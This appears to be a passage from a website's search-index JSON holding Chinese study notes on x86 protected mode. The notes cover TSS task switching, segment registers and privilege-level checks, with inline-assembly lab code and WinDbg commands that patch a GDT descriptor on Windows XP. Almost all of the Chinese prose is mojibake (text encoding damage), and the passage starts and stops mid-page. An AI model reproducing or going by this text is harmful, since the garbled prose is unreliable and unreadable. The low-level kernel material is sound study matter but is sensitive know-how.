//å­˜ä»»åŠ¡åˆ‡æ¢åcsçš„å€¼ iretd //callæ–¹å¼è¿”å› &#125;&#125;è¯•äº†ä»…æœ‰æˆå¯¹çš„pushfdå’Œpopfdï¼Œè¿™æ ·æ˜¯å¯ä»¥è¿”å›çš„1234567891011121314151617181920212223void __declspec(naked) func() &#123; dwOK=1; __asm &#123; //pushad pushfd //æ‰‹åŠ¨ä¿å­˜int 3å‰fsçš„å€¼ //push fs int 3 //pop fs mov eax,esp mov dwESP,eax //å­˜ä»»åŠ¡åˆ‡æ¢åçš„espçš„å€¼ mov word ptr [dwCS],cs //å­˜ä»»åŠ¡åˆ‡æ¢åcsçš„å€¼ popfd //popad iretd //callæ–¹å¼è¿”å› &#125;&#125;æ‰€ä»¥ï¼Œå‚è€ƒé“¾æ¥åšå®¢é‡Œçš„ä»£ç å®é™…èµ·ä½œç”¨çš„æ˜¯pushfdå’Œpopfdï¼Œè€Œä¸æ˜¯fsçš„åŸå› ã€‚æœ¬è´¨å°±æ˜¯åœ¨int 3å‰ï¼Œä¿å­˜eflçš„å€¼ï¼Œint 3åæ¢å¤eflçš„å€¼ï¼Œä¸fsæ— å…³ã€‚è€Œä¸”æˆ‘åœ¨windbgé‡Œè°ƒè¯•ï¼Œint 3å‰åfsçš„å€¼æ²¡å˜ï¼Œä¸€ç›´æ˜¯0x30æˆåŠŸè¿”å›çš„æˆªå›¾ï¼š jmp ä»»åŠ¡æ®µåˆ†æåŠä»£ç è¿è¡Œè°ƒè¯•ä½¿ç”¨jmp farè¿›è¡Œä»»åŠ¡åˆ‡æ¢ï¼ŒTSSæ®µä¸­çš„Previous Task Linkä¸ä¼šå¡«å……æ—§çš„TRï¼Œè€Œä¸”NTä½ä¸ä¼šç½®1ã€‚é‚£å°±æ²¡æ³•é€šè¿‡TSSæ®µä¸­çš„Previous Task Linkè¿”å›ä¸Šä¸€ä¸ªä»»åŠ¡ï¼Œå †æ ˆä¹Ÿæ˜¯ç©ºçš„ã€‚æ‰€ä»¥æˆ‘ä»¬è¦è‡ªå·±æ‰‹åŠ¨ä¿å­˜æ—§çš„Previous Task Linkï¼Œä¹Ÿå°±æ˜¯TRå¯„å­˜å™¨ï¼Œåˆ‡æ¢åˆ°æ–°ä»»åŠ¡åï¼Œå†JMP FARå›æ—§ä»»åŠ¡ã€‚ç”¨STRæŒ‡ä»¤æ¥è¯»TRå¯„å­˜å™¨çš„16ä½æ ¸å¿ƒä»£ç ï¼š1BYTE PrevTR[6];12345678__asm&#123; //åˆ‡æ¢å‰ä¿å­˜æ—§TR str ax lea edi,[PrevTR+4] mov [edi],ax&#125;å®Œæ•´ä»£ç ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwOK;DWORD dwESP;DWORD dwCS;BYTE PrevTR[6];void __declspec(naked) func() &#123; dwOK=1; __asm &#123; mov eax,esp mov dwESP,eax //å­˜ä»»åŠ¡åˆ‡æ¢åçš„espçš„å€¼ mov word ptr [dwCS],cs //å­˜ä»»åŠ¡åˆ‡æ¢åcsçš„å€¼ jmp fword ptr ds:[PrevTR] //jmpæ–¹å¼è¿”å› &#125;&#125;int main()&#123; char buffer[6]; //æ„é€ ä»»åŠ¡æ®µ char stack[100]=&#123;0&#125;; //æ‰¾äº†ä¸€ä¸ªå±€éƒ¨å˜é‡çš„åœ°å€å½“å †æ ˆå †æ ˆç”¨ DWORD cr3=0; //æ„é€ TSSï¼Œæ³¨é‡Šæ ‡æœ‰*è¯´æ˜ä¸ºå¿…å¡«å€¼ DWORD tss[0x68]=&#123; //0x68ï¼Œ104å­—èŠ‚ 0x00000000, //linkï¼Œä¸Šä¸€ä¸ªä»»åŠ¡çš„TRæ®µé€‰æ‹©å­ã€‚åœ¨å‘ç”Ÿä»»åŠ¡åˆ‡æ¢æ—¶CPUä¼šè‡ªåŠ¨å¡«å…… 0x00000000, //esp0 0x00000000, //ss0 0x00000000, //esp1 0x00000000, //ss1 0x00000000, //esp2 0x00000000, //ss2 cr3, //cr3* (DWORD)func, //eip * è·³è½¬çš„åœ°å€ 0x00000000, //eflags 0x00000000, //eax 0x00000000, //ecx 0x00000000, //edx 0x00000000, //ebx ((DWORD)stack) + 100, //esp * 0x00000000, //ebp 0x00000000, //esi 0x00000000, //edi 0x00000023, //es * 0x00000008, //cs * 3ç¯ï¼š0x1B 0x00000010, //ss * 3ç¯ï¼š0x23 0x00000023, //ds * 0x00000030, //fs * 3ç¯ï¼š0x3B 0x00000000, //gs 0x00000000, //ldt 0x20ac0000 //IOæƒé™ä½å›¾ï¼ŒVISTAä¹‹åä¸å†ç”¨äº†ï¼Œè¿™æ˜¯ä»ç°æœ‰çš„TSSç»“æ„ä½“æ‹·å‡ºæ¥çš„ &#125;; //è¾“å‡ºçœ‹((DWORD)stack) + 100çš„åœ°å€ï¼Œåé¢ç”¨windbgçœ‹ä»»åŠ¡åˆ‡æ¢çš„espä½œå¯¹æ¯”ç”¨ printf(&quot;Address of the ((DWORD)stack) + 100 :%p &quot;,((DWORD)stack) + 100); //ä¿®æ”¹GDTè¡¨ printf(&quot;Address of the tss array: %p &quot;, tss); // Print the 1st (leftmost) hexadecimal digit, 2nd hexadecimal digit, and the low 16 bits of the tss array address printf(&quot;1st Hex Digit: %02x, 2nd Hex Digit: %02x, Low 16 bits: %04x &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (DWORD)tss &amp; 0x0000FFFF); printf(&quot;In WinDbg, modify your constructed Task Segment Descriptor in the GDT table using the following command: eq 8003f048 %02x00e9%02x`%04x0068 &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (WORD)tss); //å› ä¸ºå˜é‡å£°æ˜é¡ºåºçš„é—®é¢˜ï¼Œè¾“å…¥cr3çš„è¯­å¥åœ¨è¿™é‡Œã€‚ç„¶åå†èµ‹ç»™tssæ•°ç»„é‡Œçš„cr3å­—æ®µ printf(&quot;After running this executable, execute !process 0 0 in WinDbg, copy the value of DirBase for the TSS.exe process, and input it below. CR3: &quot;); scanf(&quot;%x&quot;,&amp;cr3); //æ‰§è¡Œè¯¥exeåï¼Œåœ¨WinDbgä¸­ç”¨è¯¥æŒ‡ä»¤è·å–ï¼š!process 0 0 tss[7]=cr3; *(DWORD*)(&amp;buffer[0])=0x12345678; *(WORD*)(&amp;buffer[4])=0x48; //æ®µé€‰æ‹©å­0x48ï¼Œæ‹†å®Œç´¢å¼•åˆ°çš„æ˜¯8003f048 __asm &#123; //åˆ‡æ¢å‰ä¿å­˜æ—§TR str ax lea edi,[PrevTR+4] mov [edi],ax jmp fword ptr [buffer]; &#125; printf(&quot;ok = %x ESP = %x CS = %x &quot;,dwOK,dwESP,dwCS); return 0;&#125;è¿”å›ä»£ç ï¼š123456 __asm &#123; jmp fword ptr ds:[PrevTR] //jmpæ–¹å¼è¿”å› &#125;&#125;12345678910 __asm &#123;+ int 3 mov eax,esp mov dwESP,eax //å­˜ä»»åŠ¡åˆ‡æ¢åçš„espçš„å€¼ mov word ptr [dwCS],cs //å­˜ä»»åŠ¡åˆ‡æ¢åcsçš„å€¼ jmp fword ptr ds:[PrevTR] //jmpæ–¹å¼è¿”å› &#125;ç›´æ¥æ‰§è¡Œï¼Œå› int 3ä¼šæ–­åœ¨windbgä¸‹eflæ˜¯2ï¼ŒNTä½ä¸º0TRæ˜¯0x48ï¼Œå°±æ˜¯åˆšæ‰jmpçš„bufferå†jmpå›å»å‰ï¼ŒPrevTR[6]å¦‚å›¾ï¼šå›è·³æ—¶ä¸ä¾é NTä½ï¼Œç›¸å½“äºæ˜¯ç›´æ¥è·³è¿‡å»çš„ï¼Œä¸ä¼šä¾èµ–ä¸Šä¸€æ¬¡çš„ä»»åŠ¡é“¾ æ€»ç»“ ä½“ä¼š å¯¹äºä¿®æ”¹TRå¯„å­˜å™¨éƒ¨åˆ†çš„å†…å®¹æœ‰æ–°çš„ç†è§£ï¼š CALL FARæˆ–JMP FARè®¿é—®0x48:0x123456 å¦‚æœ0x48æ˜¯ä»£ç æ®µï¼Œç”±CSå½“é€‰æ‹©å­ å¦‚æœ0x48æ˜¯ä»»åŠ¡æ®µï¼Œç”±TRå½“é€‰æ‹©å­ TSSä»»åŠ¡æ®µåˆ‡æ¢æ­¥éª¤ è°ƒç”¨ call/jmp + TSSä»»åŠ¡æ®µé€‰æ‹©å­ CPUå°†è°ƒç”¨è€…çš„å¯„å­˜å™¨å­˜å…¥å½“å‰TRå¯„å­˜å™¨å¯¹åº”çš„TSSä¸­ã€‚ å°†TSSä»»åŠ¡æ®µé€‰æ‹©å­åŠ è½½åˆ°TRå¯„å­˜å™¨ä¸­ å°†æ–°çš„TRå¯„å­˜å™¨å¯¹åº”çš„TSSä»»åŠ¡æ®µä¸­çš„æ‰€æœ‰å¯„å­˜å™¨å…¨éƒ¨æ›¿æ¢ã€‚ callå’Œjmpè¿›è¡Œä»»åŠ¡åˆ‡æ¢çš„ä¸åŒä¹‹å¤„ JMPæŒ‡ä»¤è¿›è¡Œä»»åŠ¡åˆ‡æ¢ï¼ŒTSSæ®µä¸­çš„PreviousLinkä¸ä¼šè¢«èµ‹å€¼ã€‚ä¸”NTä½ä¸å˜ã€‚ CALLæŒ‡ä»¤è¿›è¡Œä»»åŠ¡åˆ‡æ¢ï¼ŒTSSæ®µä¸­çš„PreviousLinkä¼šè¢«å¡«å…¥ä¸Šä¸€ä¸ªTSSæ®µæ‰€å±TSSæ®µæè¿°ç¬¦çš„æ®µé€‰æ‹©å­ã€‚ä¸”NTä½è¢«ç½®1. ESPå’ŒESP0 å½“æˆ‘ä»¬ä¸»åŠ¨JMP CALLä»»åŠ¡æ®µæˆ–ä»»åŠ¡é—¨æ—¶ï¼ŒCPUä¼šå°†ESP SSæ›¿æ¢ã€‚ å½“æˆ‘ä»¬é€šè¿‡è°ƒç”¨é—¨ã€ä¸­æ–­é—¨è¿™ç§ææƒæ—¶ï¼ŒCPUä¼šå»æ‰¾TSSï¼Œè¿™ç§å¯ä»¥ç†è§£ä¸ºè¢«åŠ¨ã€‚è¿™æ—¶ä¼šæ ¹æ®æ–°CSçš„æƒé™æ¥é€‰æ‹©æ›¿æ¢ESP0 SS0ã€ESP1 SS1è¿˜æ˜¯ESP2 SS2ã€‚ çº¿ç¨‹åˆ‡æ¢æ—¶ç”¨TSSèµ‹å€¼ï¼Œä¸€ä¸ªçº¿ç¨‹ä¸€ä¸ªTSSã€‚è¿›0ç¯åä½¿ç”¨å †æ ˆï¼Œæ¯”å¦‚ESPæ¥åˆ°F1234567ï¼Œç”¨å®Œæ˜¯1234660ï¼Œç„¶åç¦»å¼€äº†ã€‚ä¸‹æ¬¡è¿›æ¥ï¼Œå› ä¸ºTSSçš„å€¼æ²¡å˜ï¼Œä¸‹æ¬¡è¿˜æ˜¯ä»F1234567è¿›æ¥ã€‚ æ¯ä¸ªçº¿ç¨‹ä¸¤ä¸ªå †æ ˆï¼Œä¸€ä¸ª3ç¯çš„ï¼Œä¸€ä¸ª0ç¯çš„ã€‚"},{"title":"æ®µå¯„å­˜å™¨","path":"/wiki/Protected_Mode/æ®µå¯„å­˜å™¨.html","content":"ç¯å¢ƒ xp,vc++ æ®µå¯„å­˜å™¨ç®€ä»‹ 8ä¸ª ES CS SS DS FS GS LDTR TR Windowsæ“ä½œç³»ç»Ÿä¸ä½¿ç”¨GSå¯„å­˜å™¨ï¼Œä¸€è¿›0åå°±å˜0ï¼Œæ¯”å¦‚æ–­ç‚¹ï¼Œå¼‚å¸¸ï¼Œæ•…ç”¨-è¡¨ç¤ºã€‚ FSå¯„å­˜å™¨ä¸çº¿ç¨‹ç›¸å…³ã€‚ æ®µå¯„å­˜å™¨ Selector Attribute Base Limit ES 0023 å¯è¯»ã€å¯å†™ 0 0xFFFFFFFF CS 001B å¯è¯»ã€å¯æ‰§è¡Œ 0 0xFFFFFFFF SS 0023 å¯è¯»ã€å¯å†™ 0 0xFFFFFFFF DS 0023 å¯è¯»ã€å¯å†™ 0 0xFFFFFFFF FS 003B å¯è¯»ã€å¯å†™ 0x7FFDE000 0xFFF GS - - - - å¯è¯»ï¼šå¯ä»¥å½“æºæ“ä½œæ•°ã€‚å¦‚ 1mov ax,cs å¯å†™ï¼šå½“å‰æ®µå¯„å­˜å™¨ä¿®é¥°çš„åœ°å€ï¼Œå¯ä¿®æ”¹ï¼Œå¯æ”¾åˆ°ç›®çš„æ“ä½œæ•°ã€‚å¦‚ 1mov dword ptr ds:[var],eax; å¯æ‰§è¡Œï¼šå½“å‰æ®µå¯„å­˜å™¨ä¿®é¥°çš„åœ°å€å¯èµ‹å€¼ç»™eip ç»“æ„ 96ä½ï¼Œ16ä½å¯è§ï¼Œ80ä½ä¸å¯è§ 16ä½Selecterï¼›32ä½Baseï¼Œ32ä½Limitï¼Œ16ä½Attributeã€‚ åç§° ä½æ•° å«ä¹‰ Selecter 16 Base 32 è¡¨ç¤ºæ®µä»å“ªé‡Œå¼€å§‹ã€‚æ¯ Limit 32 è¡¨ç¤ºæ®µçš„é•¿åº¦æ˜¯å¤šå°‘ Attribute 16 å±æ€§ï¼Œè¡¨ç¤ºæ®µå¯„å­˜å™¨æ˜¯å¦å¯è¯»ï¼Œå¯å†™ï¼Œå¯æ‰§è¡Œ ç”¨ODéšæ„åŠ è½½ä¸€ä¸ªç¨‹åºï¼Œ4ä½åå…­è¿›åˆ¶æ•°ï¼Œ16ä½ï¼š ç»“æ„ä½“è¡¨ç¤º 123456789struct SegMent&#123; //å¯è§ WORD Selector;//16ä½Selector //ä¸å¯è§ WORD Attributes;//16ä½Attributes DWORD Base;//32ä½Base DWORD Limit;//32ä½Limit&#125; è¿™ä¸ªç»“æ„æ˜¯ä»æ®µæè¿°ç¬¦ä¸­åŠ è½½å‡ºæ¥çš„ï¼Œæ²¡æœ‰é¡ºåºçš„ä¸¥æ ¼è¦æ±‚ æ®µå¯„å­˜å™¨çš„è¯»å†™ è¯»æ®µå¯„å­˜å™¨ 1MOV AX,EX;åªèƒ½è¯»16ä½çš„å¯è§éƒ¨åˆ† è¯»å†™LDTRï¼š 1SLDT 1LLDT è¯»å†™TRï¼š 1STR 1LTR å†™æ®µå¯„å­˜å™¨ 1MOV DS,AX;å†™96ä½ ç»ƒä¹  æ®µå¯„å­˜å™¨åªèƒ½çœ‹è§16ä½ï¼Œå¦‚ä½•è¯æ˜æœ‰96ä½? æ€è€ƒğŸ¤”æ–¹å‘åˆ©ç”¨ä¸åŒæ®µå¯„å­˜å™¨ä¸å¯è§éƒ¨åˆ†çš„å¼‚åŒï¼Œè¯æ˜æœ‰å·®å¼‚ç­”æ¡ˆ æ¢æµ‹AttributeAttributeï¼šå±æ€§ï¼Œè¡¨ç¤ºæ®µå¯„å­˜å™¨æ˜¯å¦å¯è¯»ï¼Œå¯å†™ï¼Œå¯æ‰§è¡Œæ®µå¯„å­˜å™¨AttributeCSå¯è¯»ã€å¯æ‰§è¡ŒESå¯è¯»ã€å¯å†™SSå¯è¯»ã€å¯å†™DSå¯è¯»ã€å¯å†™FSå¯è¯»ã€å¯å†™CSæ®µå¯„å­˜å™¨çš„Attributeä¸å¯å†™ï¼Œå…¶ä»–æ®µå¯„å­˜å™¨å¯å†™ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹æ¥æ¢æµ‹Attributeã€‚æ¯”å¦‚æ‹¿DSæ®µå¯„å­˜å™¨ã€‚éªŒè¯ï¼šCSä¸å¯å†™ï¼ŒDSå¯å†™ï¼Œå³å¯ã€‚(åˆ©ç”¨AXå¯„å­˜å™¨ä½œä¸ºä¸­è½¬ï¼Œå°†CSæ®µå¯„å­˜å™¨çš„å€¼ä¼ ç»™DS)123456789101112131415#include &lt;stdio.h&gt;int var=0;int main(void)&#123; __asm&#123; mov dword ptr ds:[var],10; //å¯å†™ mov ax,cs; mov ds,ax; mov dword word ds:[var],10; //ä¸å¯å†™ //varå°±æ˜¯ä¸€ä¸ªå†…å­˜åœ°å€çš„æ ‡å· &#125; return 0;&#125;ç¬¬ä¸€ä¸ªmovç¬¬äºŒä¸ªmovèµ‹å€¼æˆåŠŸèµ‹å€¼å¤±è´¥ä¸€èˆ¬åœ¨è®¿é—®çš„å†…å­˜åœ°å€æ— æ•ˆçš„æƒ…å†µä¸‹æ‰å¼¹è¿™ç§çª—ã€‚è€Œç°åœ¨æˆ‘ä»¬è®¿é—®çš„å†…å­˜åœ°å€æ˜¯æœ‰æ•ˆçš„ï¼Œè¿™æ˜¯å› ä¸ºæ®µçš„æœºåˆ¶é™åˆ¶äº†æˆ‘ä»¬ä¸èƒ½è®¿é—®è¿™å—å†…å­˜ æ¢æµ‹BaseBaseï¼šè¡¨ç¤ºæ®µä»å“ªé‡Œå¼€å§‹æ®µå¯„å­˜å™¨BaseES0CS0SS0DS0FS0x7FFDE000GS-åˆ©ç”¨è¿™ä¸¤ç‚¹æ¥è¯æ˜Baseå­˜åœ¨ï¼šåªæœ‰FSæ®µå¯„å­˜å™¨çš„Baseä¸º0x7FFDE000ï¼Œå…¶ä»–å‡ä¸º0ã€‚åœ¨å†…å­˜ç©ºé—´ä¸­ï¼Œåœ°å€ä¸º0æ˜¯ä¸å¯è¯»ä¹Ÿä¸å¯å†™çš„ã€‚123456789101112131415#include &lt;stdio.h&gt;int var=0;int main(void)&#123; __asm&#123; mov ax,fs //fs çš„ baseä¸ºTEB ç”¨dsç¼–è¯‘ä¸è¿‡å»?mark mov gs,ax mov eax,gs:[0] //gsç°åœ¨æ˜¯fsçš„å€¼ï¼Œfs.base+0 //ç›¸å½“äº //mov edx,dword ptr ds:[0x7FFDE000] //dsçš„baseé»˜è®¤æ˜¯0ï¼Œè¿™ä¸ªåœ°å€æ˜¯å¯ä»¥è®¿é—®çš„ mov dword ptr ds:[var],eax //dsçš„baseé»˜è®¤æ˜¯0ï¼Œ0+varå˜é‡çš„åœ°å€ï¼Œå³varå˜é‡çš„å€¼ &#125; return 0;&#125;ç¼–è¯‘é€šè¿‡ã€‚è¯»åˆ°äº†fs.base+0åœ°å€å¤„çš„å€¼ï¼Œè¯´æ˜baseå­˜åœ¨ã€‚å¦‚æœå•æ­¥è°ƒè¯•ï¼Œæ‰§è¡Œåˆ°mov eax,gs:[0]ï¼Œå‡ºç°å†…å­˜è®¿é—®å†²çªé”™è¯¯ã€‚åŸå› ï¼šåœ¨DEBUGçš„çŠ¶æ€ä¸‹ï¼Œæ¯æ¬¡F10å•æ­¥è°ƒè¯•ï¼Œä¼šè§¦å‘å•æ­¥è°ƒè¯•å¼‚å¸¸ï¼Œè¿›å…¥å†…æ ¸ï¼Œç„¶åèµ°å‡ºå†…æ ¸ï¼Œæ“ä½œç³»ç»Ÿä¼šæŠŠgsæ¸…é›¶äº†ï¼Œç„¶åä»£ç ä¸­æƒ³é€šè¿‡gs:[0]è¿›è¡Œå¯»å€ï¼Œè®¿é—®çš„åœ°å€æ˜¯0ï¼Œæ•…å¯¼è‡´å®éªŒæ— æ³•æˆåŠŸã€‚gsæ¢æˆesï¼Œå°±å¯ä»¥å•æ­¥è°ƒè¯•ï¼Œçœ‹åˆ°æœ€åä¸€è¡Œvarçš„å€¼æˆåŠŸè¢«ä¿®æ”¹ æ¢æµ‹LimitLimitï¼šè¡¨ç¤ºæ®µçš„é•¿åº¦æ˜¯å¤šå°‘æ®µå¯„å­˜å™¨LimitES0xFFFFFFFFCS0xFFFFFFFFSS0xFFFFFFFFDS0xFFFFFFFFFS0xFFFGS-12345678910111213141516#include &lt;stdio.h&gt;int var=0;int main(void)&#123; __asm&#123; mov ax,fs //fs çš„ baseä¸ºTEB ç”¨dsç¼–è¯‘ä¸è¿‡å»?mark mov gs,ax mov eax,gs:[0x1000] //gsç°åœ¨æ˜¯fsçš„å€¼ï¼Œfs.base+0ã€‚0x7FFDE000+0x10000 //ç›¸å½“äºä¸Šä¸€å¥æŒ‡ä»¤è®¿é—®çš„åœ°å€ç›¸å½“äºæ³¨é‡Šæ‰è¿™ä¸€å¥çš„æŒ‡ä»¤ã€‚åªä¸è¿‡dsçš„limitæ˜¯0xFFFFFFFFï¼Œè€Œfsçš„limitæ˜¯0xFFF //ä¸Šä¸€å¥æ•…æ„æ¯”limitå¤§1ï¼Œ0xFFF+1=0x1000ã€‚æ‰€ä»¥ç¼–è¯‘ä¼šå¤±è´¥ï¼Œè€Œdsçš„limitæ¯”0x1000å¤§ï¼Œæ‰€ä»¥ç¼–è¯‘èƒ½é€šè¿‡ã€‚ //mov eax,ds:[0x7FFDE000+0x1000] //è¿™ä¸€å¥èƒ½ç¼–è¯‘é€šè¿‡ mov dword ptr ds:[var],eax //dsçš„baseé»˜è®¤æ˜¯0ï¼Œ0+varå˜é‡çš„åœ°å€ï¼Œå³varå˜é‡çš„å€¼ &#125; return 0;&#125;è¦è°ƒè¯•çš„è¯ï¼ŒæŠŠgsæ¢æˆeså¯„å­˜å™¨ å†™æ®µå¯„å­˜å™¨æ—¶ï¼Œåªç»™äº†16ä½ï¼Œå‰©ä¸‹çš„80ä½å¡«ä»€ä¹ˆ? ç­”æ¡ˆç­”æ¡ˆåœ¨ä¸‹ä¸€èŠ‚å†…å®¹ è‰ç¨¿åŒº å±æ€§æ¢æµ‹å‚è€ƒï¼š ä¿æŠ¤æ¨¡å¼ç¯‡â€”â€”æ®µå¯„å­˜å™¨ X86å†…æ ¸ç¬”è®°_1_CPUä¿æŠ¤æ¨¡å¼-çœ‹é›ªè®ºå›-SSHå±±æ°´ç”» ä»¥åå¯èƒ½æœ‰ç”¨ï¼šæ”¶å½•å…ˆ è¯´æ˜ï¼š https://m-ouse.github.io/post/æ·±å…¥ç†è§£wow64-I/ https://blog.csdn.net/gatieme/article/details/50647000 VMware0606-æš‚è®°ï¼š https://www.zhihu.com/question/64511903"},{"title":"æ®µæƒé™æ£€æŸ¥","path":"/wiki/Protected_Mode/æ®µæƒé™æ£€æŸ¥.html","content":"CPUåˆ†çº§ ä¸ºä»€ä¹ˆåˆ†çº§ï¼šå®‰å…¨ã€‚ ç‰¹æƒæŒ‡ä»¤è¿è¡Œåœ¨0ç¯ã€‚ æ•°å€¼è¶Šå°ï¼Œæƒé™è¶Šå¤§ã€‚ windows x86ä¿æŠ¤æ¨¡å¼åªä½¿ç”¨äº†0ç¯å’Œ3ç¯ã€‚é©±åŠ¨è¿è¡Œåœ¨0ç¯ï¼Œåº”ç”¨ç¨‹åºè¿è¡Œåœ¨3ç¯ã€‚ è¿™ä¸ªæ˜¯ä¿æŠ¤æ¨¡å¼çš„æ¦‚å¿µï¼Œä¸æ¶‰åŠåˆ°æ“ä½œç³»ç»Ÿçš„æ¦‚å¿µï¼Œä¸è¦å¼„æ··äº†ã€‚ CPL(Current Privilege Level) CPL(Current Privilege Level)ï¼Œå½“å‰ç‰¹æƒçº§ã€‚ CSå’ŒSSä¸­å­˜å‚¨çš„æ®µé€‰æ‹©å­åä¸¤ä½ã€‚ï¼ˆCSå’ŒSSåä¸¤ä½ä¸€å®šæ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºä»£ç æ‰§è¡Œä¸€å®šè¦ç”¨å †æ ˆã€‚å¦‚æœä»£ç å’Œå †æ ˆæƒé™ä¸ä¸€æ ·ï¼Œé‚£ä¸æ‰¯äº†å—ï¼Ÿä»£ç èƒ½è·‘ï¼Ÿï¼‰ã€‚ æ‰€è°“çš„ç¨‹åºæ˜¯å‡ ç¯çš„å°±æ˜¯çœ‹CS SSï¼Œè€Œæ‰€è°“çš„ææƒå°±æ˜¯æ”¹CS SSï¼Œåªè¦æœ‰ä¸€ç§æ–¹æ³•èƒ½æ”¹æ‰CS SSï¼Œé‚£å°±æ˜¯ææƒã€‚ æ¯”å¦‚éšä¾¿æ‹–ä¸€ä¸ªexeåˆ°ODé‡Œï¼ŒCSç›®å‰æ˜¯001Bï¼Œåä¸¤ä½æ˜¯11ï¼Œä¸º3ï¼Œæ‰€ä»¥ç¨‹åºåœ¨3ç¯ã€‚ ä½¿ç”¨windbgä¸‹æ–­åï¼Œä¼šåœç•™åœ¨0ç¯çš„æŸä¸ªå†…æ ¸å‡½æ•°ä¸­ã€‚æŸ¥çœ‹æ­¤æ—¶çš„CSå¯„å­˜å™¨ï¼Œä¸º8ï¼Œåä¸¤ä½ä¸º00ï¼Œç¨‹åºåœ¨0ç¯ã€‚ DPL(Descriptor Privilege Level) DPL(Descriptor Privilege Level)ï¼Œæè¿°ç¬¦ç‰¹æƒçº§åˆ«ã€‚ DPLå­˜å‚¨åœ¨æ®µæè¿°ç¬¦ä¸­ï¼Œè§„å®šäº†è®¿é—®è¯¥æ®µæ‰€éœ€è¦çš„ç‰¹æƒçº§åˆ«æ˜¯ä»€ä¹ˆï¼Œé«˜å­—èŠ‚ï¼Œ13å’Œ14ä½ã€‚é€šä¿—çš„ç†è§£:å¦‚æœä½ æƒ³è®¿é—®æˆ‘,é‚£ä¹ˆä½ åº”è¯¥å…·å¤‡ä»€ä¹ˆç‰¹æƒ. ä¸¾ä¾‹è¯´æ˜: 1mov ds,ax å¦‚æœAXæŒ‡å‘çš„æ®µDPL=0ä½†å½“å‰ç¨‹åºçš„CPL =3ï¼Œè¿™è¡ŒæŒ‡ä»¤æ˜¯ä¸ä¼šæˆåŠŸçš„! RPL(Request Privilege Level) RPL(Request Privilege Level)ï¼Œè¯·æ±‚ç‰¹æƒçº§åˆ«ã€‚ RPLæ˜¯é’ˆå¯¹æ®µé€‰æ‹©å­è€Œè¨€çš„ï¼Œæ¯ä¸ªæ®µçš„é€‰æ‹©å­éƒ½æœ‰è‡ªå·±çš„RPLã€‚ ä¸¾ä¾‹ï¼š 12mov ax,0008\t;æ®µé€‰æ‹©å­mov ds,ax å’Œ 12mov ax,000B\t;æ®µé€‰æ‹©å­mov ds,ax ä¸¤æ®µä»£ç æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªæ®µæè¿°ç¬¦ï¼Œä½†RPLä¸ä¸€æ ·ã€‚ æ•°æ®æ®µçš„æƒé™æ£€æŸ¥ æ•°æ®æ®µä¼šåšçš„æƒé™æ£€æŸ¥: CPL&lt;=DPLå¹¶ä¸”RPL&lt;=DPL(æ•°å€¼ä¸Šçš„æ¯”è¾ƒ)ï¼Œæ‰é€šè¿‡ã€‚ ä¸¾ä¾‹ï¼š æ¯”å¦‚å½“å‰ç¨‹åºå¤„äº0ç¯ï¼Œä¹Ÿå°±æ˜¯è¯´CPL=O 12mov ax,000B //1011ï¼ŒRPL=3mov ds,ax //å‡è®¾axæŒ‡å‘çš„æ®µæè¿°ç¬¦çš„DPL=0 åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒCPLä¸º0ï¼ŒDPLä¸º0ï¼ŒRPLä¸º3.CPLå’ŒDPLçš„æ£€æŸ¥é€šè¿‡ï¼Œä½†RPLå’ŒDPLçš„æ£€æŸ¥ä¸é€šè¿‡ã€‚ ä»£ç æ®µå’Œç³»ç»Ÿæ®µæè¿°ç¬¦ä¸­çš„æ£€æŸ¥æ–¹å¼å¹¶ä¸ä¸€æ ·,åé¢ä¼šè®² æ€»ç»“ CPLï¼šCPUå½“å‰çš„æƒé™çº§åˆ« DPLï¼šå¦‚æœä½ æƒ³è®¿é—®æˆ‘,ä½ åº”è¯¥å…·å¤‡ä»€ä¹ˆæ ·çš„æƒé™ RPLï¼šç”¨ä»€ä¹ˆæƒé™å»è®¿é—®ä¸€ä¸ªæ®µ ä¸ºå•¥è¦æœ‰RPL? ç±»æ¯”ï¼šæˆ‘ä»¬æœ¬å¯ä»¥ç”¨â€œè¯»å†™â€çš„æƒé™å»æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†ä¸ºäº†é¿å…å‡ºé”™ï¼Œæœ‰äº›æ—¶å€™æˆ‘ä»¬ä½¿ç”¨â€œåªè¯»â€çš„æƒé™å»æ‰“å¼€ã€‚ ç»ƒä¹  åœ¨3ç¯èƒ½åŠ è½½çš„æ•°æ®æ®µæœ‰å“ªäº›? åœ¨0ç¯èƒ½åŠ è½½çš„æ•°æ®æ®µæœ‰å“ªäº›? è¯¦ç»†æè¿°è¿™ä¸‹é¢ä»£ç çš„æ‰§è¡Œè¿‡ç¨‹: 12mov ax,0x23mov ds,ax é¢˜ç›®1å’Œé¢˜ç›®2ç­”æ¡ˆåœ°å€æ®µæè¿°ç¬¦æ•°æ®æ®µorä»£ç æ®µDPL8003f01000cf9300`0000ffffæ•°æ®æ®µ008003f02000cff300`0000ffffæ•°æ®æ®µ118003f030ffc093df`f0000001æ•°æ®æ®µ008003f0380040f300`00000fffæ•°æ®æ®µ118003f0400000f200`0400ffffæ•°æ®æ®µ118003f06000009302`2f40ffffæ•°æ®æ®µ008003f0680000920b`80003fffæ•°æ®æ®µ008003f070ff0092ff`700003ffæ•°æ®æ®µ008003f08080009240`0000ffffæ•°æ®æ®µ008003f08800009200`00000000æ•°æ®æ®µ008003f0e800009200`0000ffffæ•°æ®æ®µ008003f0f800009200`0000ffffæ•°æ®æ®µ00é¢˜ç›®3ç­”æ¡ˆé€‰æ‹©å­0x230000 0000 0010 0011Indexï¼š0000 0000 0010 0ï¼Œç´¢å¼•æ˜¯4ï¼Œç¬¬5ä¸ªRPLï¼š11TIï¼š0ï¼ŒæŸ¥GDTè¡¨1234kd&gt; dq 8003f000 L58003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffa00`0000ffff8003f020 